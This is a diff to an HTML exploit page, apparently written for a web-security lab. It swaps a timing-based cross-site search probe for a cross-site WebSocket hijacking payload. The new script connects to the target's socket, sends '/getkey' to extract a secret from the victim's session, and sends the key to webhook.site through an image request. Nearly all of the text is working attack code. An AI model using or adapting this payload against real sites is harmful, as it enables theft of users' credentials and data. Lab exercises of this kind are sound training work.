@@ -1,15 +1,21 @@
 <html>
-<body>
-<script>
+  <body>
+    <script>
+      // Connect to the target WebSocket
+      const ws = new WebSocket("ws://ptl-47c9589f4c77-31b67912c868.libcurl.me/socket");
 
-var xhr = new XMLHttpRequest();
-xhr.open('GET','http://ptl-47c9589f4c77-31b67912c868.libcurl.me//search?search=^z');
+      ws.onopen = () => {
+        // Send the command that leaks the sensitive data
+        ws.send("/getkey");
+      };
 
-t1 = performance.now();
-xhr.send(null);
-t2 = performance.now();
-document.write(t2-t1);
+      ws.onmessage = (event) => {
+        const key = event.data;
 
-</script>
-</body>
+        // Leak the data to your own server (via webhook.site)
+        const img = new Image();
+        img.src = "https://webhook.site/your-unique-url?leaked=" + encodeURIComponent(key);
+      };
+    </script>
+  </body>
 </html>
